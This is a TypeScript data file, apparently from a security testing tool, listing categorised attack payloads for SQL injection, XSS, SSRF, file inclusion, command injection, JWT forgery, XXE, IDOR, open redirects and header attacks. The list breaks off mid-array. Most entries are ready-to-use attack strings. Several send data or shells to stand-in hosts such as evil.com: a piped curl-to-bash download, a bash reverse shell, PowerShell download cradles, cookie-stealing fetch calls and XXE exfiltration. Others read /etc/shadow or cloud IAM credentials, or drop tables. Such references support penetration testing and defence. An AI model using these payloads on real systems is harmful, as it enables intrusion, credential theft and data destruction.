export interface Payload {
  id: number;
  code: string;
  description: string;
  category: string;
  severity: "critical" | "high" | "medium" | "low";
  useCase: string;
}

export interface PayloadCategory {
  id: string;
  name: string;
  description: string;
  payloads: Payload[];
}

let _id = 0;
const p = (
  code: string,
  description: string,
  category: string,
  severity: Payload["severity"],
  useCase: string
): Payload => ({ id: ++_id, code, description, category, severity, useCase });

export const PAYLOAD_CATEGORIES: PayloadCategory[] = [
  {
    id: "sqli",
    name: "SQL Injection",
    description: "Payloads for testing SQL injection vulnerabilities across different database engines, contexts, and techniques.",
    payloads: [
      // Union-based
      p("' UNION SELECT NULL,NULL,NULL--", "UNION column enumeration", "Union Select", "critical", "Determine number of columns in a SELECT query before extracting data"),
      p("' UNION SELECT username,password,NULL FROM users--", "Data exfiltration via UNION", "Union Select", "critical", "Extract credentials when column count is known"),
      p("' UNION SELECT table_name,NULL FROM information_schema.tables--", "Schema enumeration", "Union Select", "high", "Map database schema by listing all table names"),
      p("' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", "Column enumeration", "Union Select", "high", "Discover column names in a specific table"),
      p("' UNION SELECT group_concat(username,0x3a,password),NULL FROM users--", "Concatenated extraction", "Union Select", "critical", "Extract multiple rows in a single query"),
      p("' UNION ALL SELECT NULL,NULL,CONCAT(version(),0x3a,user(),0x3a,database())--", "DB fingerprint via UNION", "Union Select", "high", "Identify database version, user, and current database"),
      // Blind boolean-based
      p("' AND 1=1--", "Boolean true condition", "Blind Boolean", "high", "Baseline true response for boolean-based blind injection"),
      p("' AND 1=2--", "Boolean false condition", "Blind Boolean", "high", "Compare against true condition to confirm injection point"),
      p("' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--", "Character brute-force", "Blind Boolean", "high", "Extract data one character at a time via binary search"),
      p("' AND (SELECT COUNT(*) FROM users)>0--", "Table existence check", "Blind Boolean", "medium", "Verify whether a specific table exists in the database"),
      p("' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--", "Password length enumeration", "Blind Boolean", "high", "Determine the length of a field value for targeted extraction"),
      // Error-based
      p("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "MSSQL error extraction", "Error-Based", "high", "Force type conversion error to leak data in error messages"),
      p("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "XML error extraction (MySQL)", "Error-Based", "high", "Use XML functions to extract data through error output"),
      p("' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--", "UpdateXML error-based", "Error-Based", "high", "Alternative XML function for error-based data extraction"),
      p("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "Floor error-based", "Error-Based", "high", "Classic MySQL error-based technique using FLOOR/RAND collision"),
      p("' AND polygon((SELECT * FROM(SELECT * FROM(SELECT @@version)f)x))--", "Polygon error-based", "Error-Based", "high", "Geometry function abuse for error-based extraction"),
      // Time-based
      p("' AND (SELECT SLEEP(5))--", "MySQL time-based blind", "Time-Based", "high", "Confirm injection via observable delay in MySQL"),
      p("'; WAITFOR DELAY '0:0:5'--", "MSSQL time-based blind", "Time-Based", "high", "Confirm injection via observable delay in MSSQL"),
      p("' AND IF(1=1,SLEEP(5),0)--", "Conditional time-based", "Time-Based", "high", "Conditional delay to extract boolean data over time"),
      p("1; SELECT pg_sleep(5)--", "PostgreSQL time-based", "Time-Based", "high", "Confirm injection via observable delay in PostgreSQL"),
      p("' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)--", "Time-based character extraction", "Time-Based", "high", "Extract data character-by-character using timed responses"),
      // Advanced
      p("'; EXEC xp_cmdshell('whoami')--", "MSSQL command execution", "Advanced", "critical", "Achieve OS command execution via MSSQL xp_cmdshell"),
      p("-1' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--", "File read via SQLi", "Advanced", "critical", "Read server files through MySQL LOAD_FILE function"),
      p("'; COPY (SELECT '') TO PROGRAM 'curl attacker.com'--", "PostgreSQL RCE", "Advanced", "critical", "Execute OS commands via PostgreSQL COPY TO PROGRAM"),
      p("1'; DROP TABLE users;--", "Destructive injection (use in labs only)", "Advanced", "critical", "Test for stacked query support — NEVER use on production"),
      p("' OR 1=1 ORDER BY 1 DESC--", "Sorted bypass with ORDER BY", "Advanced", "medium", "Test injection in ORDER BY context for column enumeration"),
      p("') OR ('1'='1", "Parenthesis context bypass", "Advanced", "high", "Escape parenthesized WHERE clause conditions"),
      p("\\x27 OR 1=1--", "Hex-encoded quote bypass", "Advanced", "medium", "Bypass input filters that block literal single quotes"),
      p("' HAVING 1=1--", "GROUP BY enumeration probe", "Advanced", "medium", "Trigger error to reveal column names in GROUP BY queries"),
    ],
  },
  {
    id: "xss",
    name: "XSS",
    description: "Cross-site scripting payloads for reflected, stored, DOM-based, and filter-bypass scenarios.",
    payloads: [
      // Reflected
      p("<script>alert(document.domain)</script>", "Classic reflected XSS", "Reflected", "high", "Test for unescaped output in HTML body context"),
      p("'\"><img src=x onerror=alert(1)>", "Attribute breakout XSS", "Reflected", "high", "Break out of an HTML attribute and inject an event handler"),
      p("<svg/onload=alert(1)>", "SVG onload XSS", "Reflected", "high", "Minimal tag-based XSS that fires on element load"),
      p("<input onfocus=alert(1) autofocus>", "Autofocus event XSS", "Reflected", "medium", "Self-triggering XSS via autofocus attribute"),
      p("\" onfocus=alert(1) autofocus=\"", "Double-quote attribute injection", "Reflected", "high", "Inject event handler inside a double-quoted attribute"),
      // Stored
      p("<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>", "Cookie stealing stored XSS", "Stored", "critical", "Exfiltrate cookies via stored XSS in user-generated content"),
      p("<body onload=alert(1)>", "Body onload stored XSS", "Stored", "high", "Persistent XSS that fires when page loads"),
      p("<a href=\"javascript:alert(1)\">Click me</a>", "Anchor protocol XSS", "Stored", "high", "Stored XSS via javascript: protocol in user-submitted links"),
      p("<details open ontoggle=alert(1)>", "Details toggle stored XSS", "Stored", "medium", "Self-triggering XSS via HTML5 details element"),
      p("<iframe src=\"javascript:alert(1)\">", "Iframe injection XSS", "Stored", "high", "Persistent XSS via iframe with javascript protocol"),
      // DOM-based
      p("#<img src=x onerror=alert(1)>", "Hash-based DOM XSS", "DOM-Based", "high", "Exploit client-side code that reads location.hash unsafely"),
      p("javascript:alert(document.cookie)", "JavaScript protocol DOM XSS", "DOM-Based", "critical", "Test href/src attributes populated from user input"),
      p("'-alert(1)-'", "JavaScript context injection", "DOM-Based", "high", "Inject into inline JavaScript string context"),
      p("${alert(1)}", "Template literal injection", "DOM-Based", "high", "Exploit template literals in client-side JavaScript"),
      p("</script><script>alert(1)</script>", "Script tag breakout", "DOM-Based", "high", "Close existing script tag and inject new one"),
      // Filter bypass
      p("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//", "Polyglot XSS", "Filter Bypass", "critical", "Multi-context payload that works across HTML, JS, and URL contexts"),
      p("<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", "Mutation XSS (mXSS)", "Filter Bypass", "critical", "Bypass DOMPurify/sanitizers via DOM mutation during parsing"),
      p("{{constructor.constructor('alert(1)')()}}", "Angular template injection", "Filter Bypass", "critical", "Bypass Angular sandbox via constructor chain"),
      p("<img src=1 onerror=alert`1`>", "Template literal alert (no parens)", "Filter Bypass", "high", "Bypass parenthesis filters using tagged template literals"),
      p("';window['ale'+'rt'](1)//", "String concatenation bypass", "Filter Bypass", "high", "Evade keyword filters by splitting function name"),
      p("<svg><animate onbegin=alert(1)>", "SVG animate event bypass", "Filter Bypass", "medium", "Bypass tag allowlists that permit SVG but miss animate events"),
      p("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "Unicode escape bypass", "Filter Bypass", "medium", "Bypass filters that check for literal angle brackets"),
      p("<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">", "Base64 obfuscated XSS", "Filter Bypass", "high", "Evade payload signature detection using base64 encoding"),
      p("\"onmouseover=\"alert(1)\" style=\"position:fixed;width:100%;height:100%;top:0;left:0\"", "Full-screen mouseover XSS", "Filter Bypass", "high", "Create unavoidable hover trigger covering entire viewport"),
      p("<form><button formaction=javascript:alert(1)>X</button>", "Form action XSS", "Filter Bypass", "high", "Exploit formaction attribute for JavaScript execution"),
      p("data:text/html,<script>alert(1)</script>", "Data URI XSS", "Filter Bypass", "high", "Bypass URL validation that doesn't block data: protocol"),
    ],
  },
  {
    id: "ssrf",
    name: "SSRF",
    description: "Server-Side Request Forgery payloads for accessing internal services, cloud metadata, and bypassing URL filters.",
    payloads: [
      // Cloud metadata
      p("http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata", "Cloud Metadata", "critical", "Access AWS instance metadata to find IAM credentials"),
      p("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM role credentials", "Cloud Metadata", "critical", "Retrieve temporary AWS credentials for privilege escalation"),
      p("http://169.254.169.254/latest/user-data", "AWS user-data scripts", "Cloud Metadata", "high", "Read instance bootstrap scripts that may contain secrets"),
      p("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP service account token", "Cloud Metadata", "critical", "Steal GCP OAuth token for cloud API access"),
      p("http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys", "GCP SSH keys", "Cloud Metadata", "critical", "Extract SSH keys from GCP project metadata"),
      p("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata", "Cloud Metadata", "critical", "Access DigitalOcean droplet metadata endpoint"),
      // Internal services
      p("http://127.0.0.1:6379/INFO", "Redis internal access", "Internal Services", "high", "Probe for unauthenticated Redis on localhost"),
      p("http://127.0.0.1:9200/_cluster/health", "Elasticsearch cluster health", "Internal Services", "high", "Check for open Elasticsearch on internal network"),
      p("http://127.0.0.1:2375/containers/json", "Docker API access", "Internal Services", "critical", "Access Docker daemon API for container escape/RCE"),
      p("http://localhost:8500/v1/agent/members", "Consul internal API", "Internal Services", "high", "Enumerate Consul service mesh members"),
      p("http://127.0.0.1:5984/_all_dbs", "CouchDB database listing", "Internal Services", "high", "List all databases on internal CouchDB instance"),
      p("http://localhost:9090/api/v1/targets", "Prometheus targets", "Internal Services", "medium", "Enumerate monitored targets via Prometheus API"),
      // IP bypass techniques
      p("http://0x7f000001/", "Hex IP bypass (127.0.0.1)", "IP Bypass", "high", "Bypass URL denylist using hexadecimal IP notation"),
      p("http://0177.0.0.1/", "Octal IP bypass", "IP Bypass", "high", "Bypass URL denylist using octal IP notation"),
      p("http://2130706433/", "Decimal IP bypass", "IP Bypass", "high", "Bypass URL denylist using decimal IP notation"),
      p("http://[::1]/", "IPv6 localhost bypass", "IP Bypass", "high", "Bypass IPv4 denylist using IPv6 loopback address"),
      p("http://127.1/", "Shortened localhost", "IP Bypass", "medium", "Bypass strict regex patterns checking for 127.0.0.1"),
      p("http://0/", "Zero IP bypass", "IP Bypass", "medium", "Some systems resolve 0 to 127.0.0.1"),
      p("http://spoofed.burpcollaborator.net", "DNS rebinding test", "IP Bypass", "high", "Use DNS rebinding to bypass server-side URL validation"),
      // Protocol abuse
      p("gopher://127.0.0.1:25/xHELO%20localhost", "Gopher SMTP relay", "Protocol Abuse", "critical", "Send SMTP commands via gopher protocol for email relay"),
      p("file:///etc/passwd", "Local file read via file://", "Protocol Abuse", "critical", "Read local files when file:// protocol is allowed"),
      p("dict://127.0.0.1:11211/stat", "Memcached via dict protocol", "Protocol Abuse", "high", "Access Memcached stats through dict:// protocol"),
    ],
  },
  {
    id: "lfi",
    name: "LFI/RFI",
    description: "Local and Remote File Inclusion payloads for reading sensitive files via path traversal and PHP wrappers.",
    payloads: [
      // Linux paths
      p("../../../etc/passwd", "Linux password file", "Linux Paths", "high", "Read /etc/passwd to confirm LFI and enumerate users"),
      p("../../../etc/shadow", "Linux shadow file", "Linux Paths", "critical", "Attempt to read password hashes (requires root permissions)"),
      p("../../../etc/hostname", "Hostname disclosure", "Linux Paths", "medium", "Identify the server hostname for reconnaissance"),
      p("../../../proc/self/environ", "Environment variables", "Linux Paths", "high", "Leak environment variables which may contain secrets/API keys"),
      p("../../../proc/self/cmdline", "Process command line", "Linux Paths", "medium", "Reveal the command used to start the current process"),
      p("../../../var/log/apache2/access.log", "Apache access log", "Linux Paths", "high", "Read web server logs; can be used for log poisoning RCE"),
      p("../../../proc/self/fd/0", "File descriptor access", "Linux Paths", "medium", "Access open file descriptors of the current process"),
      // Windows paths
      p("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts file", "Windows Paths", "high", "Read Windows hosts file to identify internal hostnames"),
      p("..\\..\\..\\windows\\system.ini", "Windows system.ini", "Windows Paths", "high", "Classic Windows LFI confirmation file"),
      p("..\\..\\..\\windows\\win.ini", "Windows win.ini", "Windows Paths", "high", "Read Windows configuration file to confirm LFI on Windows"),
      p("..\\..\\..\\inetpub\\logs\\LogFiles\\", "IIS log files", "Windows Paths", "high", "Access IIS web server logs for log poisoning attacks"),
      // Null byte / encoding
      p("/etc/passwd%00", "Null byte truncation (legacy)", "Null Byte", "high", "Bypass file extension appending on PHP < 5.3.4"),
      p("..%252f..%252f..%252fetc/passwd", "Double URL encoding", "Encoding Bypass", "high", "Bypass WAF/filter that only decodes URLs once"),
      p("..%c0%af..%c0%af..%c0%afetc/passwd", "UTF-8 overlong encoding", "Encoding Bypass", "high", "Exploit improper UTF-8 validation to bypass path filters"),
      p("....//....//....//etc/passwd", "Nested traversal bypass", "Encoding Bypass", "high", "Bypass filters that strip single ../ occurrences"),
      p("..;/..;/..;/etc/passwd", "Semicolon insertion (Tomcat)", "Encoding Bypass", "high", "Bypass Tomcat path normalization with semicolons"),
      // PHP wrappers
      p("php://filter/convert.base64-encode/resource=index.php", "PHP filter base64 read", "PHP Wrappers", "critical", "Read PHP source code encoded in base64 to bypass execution"),
      p("php://input", "PHP input wrapper (RCE via POST)", "PHP Wrappers", "critical", "Achieve RCE by sending PHP code in POST body"),
      p("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "Data wrapper RCE", "PHP Wrappers", "critical", "Execute arbitrary PHP via data:// wrapper with base64 payload"),
      p("expect://whoami", "Expect wrapper RCE", "PHP Wrappers", "critical", "Execute system commands via expect:// wrapper"),
      p("phar://uploads/avatar.jpg/shell.php", "Phar deserialization", "PHP Wrappers", "critical", "Trigger PHP deserialization via uploaded phar archive"),
      p("zip://uploads/evil.zip%23shell.php", "ZIP wrapper inclusion", "PHP Wrappers", "critical", "Include PHP file from within an uploaded ZIP archive"),
      p("php://filter/read=string.rot13/resource=index.php", "ROT13 filter read", "PHP Wrappers", "medium", "Alternative filter encoding to bypass base64 detection"),
    ],
  },
  {
    id: "cmdi",
    name: "Command Injection",
    description: "OS command injection payloads for bash and PowerShell, including blind detection techniques.",
    payloads: [
      // Bash
      p("; whoami", "Semicolon command chain", "Bash", "critical", "Append command after a semicolon to test basic command injection"),
      p("| whoami", "Pipe command injection", "Bash", "critical", "Pipe output to a new command in shell context"),
      p("$(whoami)", "Command substitution", "Bash", "critical", "Inject via $() syntax which is evaluated before the outer command"),
      p("`whoami`", "Backtick execution", "Bash", "critical", "Legacy command substitution using backticks"),
      p("|| whoami", "OR operator injection", "Bash", "critical", "Execute command when previous command fails"),
      p("&& whoami", "AND operator injection", "Bash", "critical", "Execute command when previous command succeeds"),
      p("; curl http://evil.com/shell.sh | bash", "Remote shell download", "Bash", "critical", "Download and execute remote script for full system compromise"),
      p("; bash -i >& /dev/tcp/evil.com/4444 0>&1", "Bash reverse shell", "Bash", "critical", "Establish interactive reverse shell connection"),
      p("${IFS}cat${IFS}/etc/passwd", "IFS space bypass", "Bash", "high", "Bypass space filters using Internal Field Separator variable"),
      p("%0awhoami", "Newline injection", "Bash", "high", "Inject newline to start new command when spaces/semicolons are filtered"),
      p("; python3 -c 'import os;os.system(\"id\")'", "Python command execution", "Bash", "critical", "Use Python interpreter as alternative execution vector"),
      p("w]h[o]a[m]i", "Bracket character bypass", "Bash", "medium", "Bypass keyword filters using shell glob bracket syntax"),
      // PowerShell
      p("; powershell -enc <base64>", "Encoded PowerShell command", "PowerShell", "critical", "Execute base64-encoded PowerShell for filter bypass"),
      p("| powershell -c \"Invoke-WebRequest http://evil.com/payload -OutFile C:\\payload.exe\"", "PowerShell file download", "PowerShell", "critical", "Download remote payload via PowerShell cmdlet"),
      p("; powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')", "PowerShell cradle", "PowerShell", "critical", "In-memory PowerShell script execution without writing to disk"),
      p("| cmd /c dir", "CMD command execution", "PowerShell", "high", "Execute Windows CMD commands through pipe injection"),
      // Blind detection
      p("$(sleep 5)", "Blind time-based (sleep)", "Blind Detection", "high", "Detect blind command injection via observable time delay"),
      p("; ping -c 10 127.0.0.1", "Blind detection via ping", "Blind Detection", "medium", "Detect injection via network delay from ICMP pings"),
      p("; curl http://collaborator.evil.com", "Blind out-of-band detection", "Blind Detection", "high", "Detect injection via DNS/HTTP callback to attacker server"),
      p("; nslookup $(whoami).evil.com", "DNS exfiltration", "Blind Detection", "high", "Exfiltrate command output via DNS subdomain query"),
    ],
  },
  {
    id: "jwt",
    name: "JWT Attacks",
    description: "JSON Web Token manipulation payloads for authentication bypass, algorithm confusion, and claim tampering.",
    payloads: [
      // None algorithm
      p('{"alg":"none","typ":"JWT"}', "Algorithm none bypass", "None Algorithm", "critical", "Set algorithm to none to skip signature verification entirely"),
      p('{"alg":"None","typ":"JWT"}', "Case variation none bypass", "None Algorithm", "critical", "Bypass case-sensitive algorithm checks with mixed casing"),
      p('{"alg":"NONE","typ":"JWT"}', "Uppercase NONE bypass", "None Algorithm", "critical", "Another case variation to bypass algorithm validation"),
      p('{"alg":"nOnE","typ":"JWT"}', "Mixed case none bypass", "None Algorithm", "critical", "Exploit inconsistent case normalization in JWT libraries"),
      // Algorithm confusion RS256→HS256
      p('Header: {"alg":"HS256"} → Sign with RSA public key as HMAC secret', "RS256 to HS256 downgrade", "Algorithm Confusion", "critical", "Exploit asymmetric/symmetric algorithm confusion to forge tokens"),
      p('{"alg":"HS256"} → sign with empty string ""', "Empty secret signing", "Algorithm Confusion", "critical", "Sign with empty secret when server doesn't validate secret length"),
      p('{"alg":"HS384"} → sign with RSA public key', "RS384 to HS384 downgrade", "Algorithm Confusion", "critical", "Same confusion attack with 384-bit algorithm variants"),
      // Key injection
      p('{"kid":"../../dev/null"} + sign with empty secret', "KID path traversal", "Key Injection", "critical", "Use /dev/null as key file to sign with empty key material"),
      p('{"kid":"key1\' UNION SELECT \'attacker-secret\' --"}', "KID SQL injection", "Key Injection", "critical", "Inject SQL in kid header to control the signing key"),
      p('{"jku":"https://evil.com/.well-known/jwks.json"}', "JKU header injection", "Key Injection", "critical", "Point JKU to attacker-controlled JWKS for key substitution"),
      p('{"x5u":"https://evil.com/cert.pem"}', "X5U header injection", "Key Injection", "critical", "Point X5U to attacker certificate for signature validation bypass"),
      // Claim tampering
      p('Change "sub":"user123" → "sub":"admin"', "Subject claim escalation", "Claim Tampering", "critical", "Impersonate another user by modifying the subject claim"),
      p('Add "role":"admin" to payload claims', "Role claim injection", "Claim Tampering", "high", "Escalate privileges by adding/modifying role claims"),
      p('{"exp":9999999999}', "Expiration bypass", "Claim Tampering", "high", "Set token expiry far in the future to prevent expiration"),
      p('Change "iss":"trusted.com" to match expected issuer', "Issuer spoofing", "Claim Tampering", "high", "Bypass issuer validation by setting expected issuer value"),
      // Weak secrets
      p("Sign with common secrets: secret, password, 123456, changeme", "Weak secret brute force", "Weak Secrets", "high", "Test JWT signed with commonly used weak HMAC secrets"),
      p("hashcat -m 16500 jwt.txt wordlist.txt", "Offline JWT cracking", "Weak Secrets", "high", "Crack HMAC-signed JWT offline using hashcat with wordlist"),
      p("python3 jwt_tool.py <token> -C -d wordlist.txt", "jwt_tool dictionary attack", "Weak Secrets", "high", "Automated JWT secret cracking with jwt_tool"),
    ],
  },
  {
    id: "traversal",
    name: "Path Traversal",
    description: "Directory traversal payloads using various encoding and bypass techniques to access files outside web root.",
    payloads: [
      // Basic
      p("../../../etc/passwd", "Basic directory traversal", "Basic", "high", "Standard dot-dot-slash traversal to read system files"),
      p("..\\..\\..\\windows\\system.ini", "Windows backslash traversal", "Basic", "high", "Use backslashes for traversal on Windows servers"),
      p("/var/www/../../etc/passwd", "Absolute path traversal", "Basic", "high", "Start from known path and traverse upward"),
      p("....//....//....//etc/passwd", "Nested dot-dot bypass", "Basic", "high", "Bypass filters that strip single ../ by nesting them"),
      p(".././.././.././etc/passwd", "Mixed separator traversal", "Basic", "medium", "Alternate pattern to bypass regex-based path filters"),
      // URL-encoded
      p("..%2f..%2f..%2fetc/passwd", "Single URL-encoded traversal", "URL Encoded", "high", "Bypass filters that check literal ../ but not URL-encoded form"),
      p("..%252f..%252f..%252fetc/passwd", "Double URL-encoded traversal", "URL Encoded", "high", "Bypass double-decoding WAFs and proxies"),
      p("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "Fully encoded dots and slashes", "URL Encoded", "high", "Encode every special character to evade pattern matching"),
      p("..%5c..%5c..%5cwindows%5csystem.ini", "Encoded backslash (Windows)", "URL Encoded", "high", "URL-encode backslashes for Windows path traversal"),
      p("..%c0%af..%c0%af..%c0%afetc/passwd", "UTF-8 overlong encoding", "URL Encoded", "high", "Exploit overlong UTF-8 sequences to represent /"),
      p("/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "Overlong dots encoding", "URL Encoded", "high", "Use overlong UTF-8 for dots in traversal path"),
      // Platform-specific
      p("..;/..;/..;/etc/passwd", "Tomcat semicolon bypass", "Platform Specific", "high", "Exploit Tomcat's path parameter handling with semicolons"),
      p("..%00/..%00/..%00/etc/passwd", "Null byte path segments", "Platform Specific", "high", "Insert null bytes between path components"),
      p("file:///etc/passwd", "File protocol traversal", "Platform Specific", "high", "Use file:// protocol when URL schemes are accepted"),
      p("\\..\\..\\..\\..\\etc\\passwd", "Leading backslash traversal", "Platform Specific", "medium", "Windows-style traversal that may work on misconfigured servers"),
      p("....\\\\....\\\\....\\\\etc/passwd", "Double backslash bypass", "Platform Specific", "medium", "Bypass path normalization with double backslashes"),
    ],
  },
  {
    id: "xxe",
    name: "XXE",
    description: "XML External Entity injection payloads for file reading, SSRF, and data exfiltration via XML parsers.",
    payloads: [
      p('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "Classic XXE file read", "File Read", "critical", "Read local files through XML entity expansion"),
      p('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', "XXE to SSRF (AWS metadata)", "SSRF Chain", "critical", "Chain XXE with SSRF to access cloud metadata endpoints"),
      p('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>', "Out-of-band XXE via external DTD", "OOB Exfil", "critical", "Exfiltrate data out-of-band when response is not reflected"),
      p('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>', "XXE with PHP filter wrapper", "File Read", "critical", "Read binary/special files through base64 encoding"),
      p('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>', "XXE to RCE via expect://", "RCE", "critical", "Achieve command execution through expect wrapper"),
      p('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', "Windows file read XXE", "File Read", "high", "Read Windows configuration files via XXE"),
      p('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>', "Billion laughs DoS", "DoS", "medium", "Exponential entity expansion causing memory exhaustion"),
      p('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?d=%file;\'>">%eval;%exfil;]>', "Parametric entity OOB exfil", "OOB Exfil", "critical", "Use parameter entities for out-of-band data exfiltration"),
      p('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>', "SVG-based XXE", "File Read", "high", "Exploit SVG XML parsing for file read via xlink:href"),
      p('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/evil.txt">]><foo>&xxe;</foo>', "JAR protocol XXE", "Protocol Abuse", "high", "Abuse jar:// protocol for SSRF and file access"),
      p('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>', "Netdoc protocol XXE", "Protocol Abuse", "high", "Use Java netdoc:// protocol for alternative file access"),
      p('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]><foo>&xxe;</foo>', "XXE to Redis via gopher", "SSRF Chain", "critical", "Chain XXE with gopher protocol to interact with Redis"),
    ],
  },
  {
    id: "idor",
    name: "IDOR Patterns",
    description: "Insecure Direct Object Reference patterns for testing horizontal and vertical authorization bypass.",
    payloads: [
      p("/api/users/1 → /api/users/2", "Sequential user ID enumeration", "Horizontal", "high", "Test if changing numeric user ID grants access to other users' data"),
      p("/api/orders/ORD-001 → ORD-002", "Predictable order ID", "Horizontal", "high", "Enumerate orders with predictable identifiers"),
      p("user_id=123 → user_id=124", "Parameter tampering", "Horizontal", "high", "Swap user_id parameter to access another user's resources"),
      p("PUT /api/users/123 {\"role\":\"admin\"}", "Mass assignment privilege escalation", "Vertical", "critical", "Modify role/permissions via unprotected fields in update requests"),
      p("POST /api/password-reset {\"user_id\":\"victim\"}", "Password reset IDOR", "Vertical", "critical", "Reset another user's password by changing the user identifier"),
      p("GET /api/admin/users (with regular user token)", "Admin endpoint access", "Vertical", "critical", "Access admin-only endpoints with a non-admin authentication token"),
      p("/api/invoices/download?id=1001 → id=1002", "Document download IDOR", "Horizontal", "high", "Download other users' invoices/documents by changing ID"),
      p("/graphql { user(id: \"other-user-id\") { email ssn } }", "GraphQL IDOR", "Horizontal", "high", "Query other users' sensitive data via GraphQL ID argument"),
      p("DELETE /api/comments/456 (another user's comment)", "Destructive IDOR", "Horizontal", "high", "Delete resources belonging to other users"),
      p("/api/v1/profile → swap Authorization header", "Token swap IDOR", "Horizontal", "critical", "Use one user's token to access another user's profile endpoint"),
      p("/api/messages?conversation_id=OTHER_CONV", "Conversation access IDOR", "Horizontal", "high", "Read private conversations by changing conversation identifier"),
      p("PATCH /api/users/123 {\"email\":\"attacker@evil.com\"}", "Account takeover via IDOR", "Vertical", "critical", "Change another user's email to attacker-controlled address"),
    ],
  },
  {
    id: "redirect",
    name: "Open Redirect",
    description: "Open redirect payloads for phishing, OAuth token theft, and chaining with other vulnerabilities.",
    payloads: [
      p("/redirect?url=https://evil.com", "Basic open redirect", "Basic", "medium", "Test for unvalidated redirect parameter"),
      p("//evil.com", "Protocol-relative redirect", "Bypass", "medium", "Bypass scheme validation while redirecting to external domain"),
      p("/\\evil.com", "Backslash confusion redirect", "Bypass", "medium", "Exploit URL parser differences between frontend and backend"),
      p("https://target.com@evil.com", "Credential section bypass", "Bypass", "high", "Abuse URL userinfo section to redirect to attacker domain"),
      p("/redirect?url=https://evil.com%23.target.com", "Fragment bypass redirect", "Bypass", "medium", "Use fragment to make evil domain look like target subdomain"),
      p("javascript:alert(1)//https://target.com", "JavaScript protocol redirect", "XSS Chain", "high", "Achieve XSS via redirect parameter accepting javascript: protocol"),
      p("/redirect?url=https://evil.com%00.target.com", "Null byte domain bypass", "Bypass", "high", "Use null byte to truncate domain validation"),
      p("/redirect?url=https://evïl.com", "Unicode homograph bypass", "Bypass", "medium", "Use lookalike Unicode characters to bypass domain allowlist"),
      p("/%0d%0aLocation:%20https://evil.com", "CRLF header injection redirect", "Advanced", "high", "Inject Location header via CRLF to force redirect"),
      p("/redirect?url=https://target.com.evil.com", "Subdomain confusion redirect", "Bypass", "medium", "Register attacker subdomain that includes target domain name"),
    ],
  },
  {
    id: "headers",
    name: "HTTP Header Attacks",
    description: "Malicious HTTP header payloads for access bypass, cache poisoning, and request smuggling.",
    payloads: [
      p("Host: evil.com", "Host header injection", "Host Injection", "high", "Test for host header injection in password reset emails and redirects"),
      p("X-Forwarded-For: 127.0.0.1", "IP spoofing via XFF", "Access Bypass", "high", "Bypass IP-based access controls by spoofing X-Forwarded-For"),
      p("X-Original-URL: /admin", "URL rewrite bypass", "Access Bypass", "critical", "Bypass front-end access controls using X-Original-URL header"),
      p("X-Rewrite-URL: /admin", "Rewrite URL bypass", "Access Bypass", "critical", "Alternative header for URL rewrite bypass on IIS/Nginx"),
      p("X-Forwarded-Host: evil.com", "Forwarded host injection", "Host Injection", "high", "Inject attacker domain into host-based routing logic"),
      p("X-Custom-IP-Authorization: 127.0.0.1", "Custom IP auth bypass", "Access Bypass", "high", "Bypass custom IP-based authorization middleware"),
      p("Transfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked", "HTTP request smuggling (CL.TE)", "Request Smuggling", "critical", "Exploit ambiguous Transfer-Encoding for request smuggling"),
      p("Content-Length: 0\\r\\nTransfer-Encoding: chunked", "CL.TE smuggling variant", "Request Smuggling", "critical", "Classic CL.TE desync attack for request smuggling"),
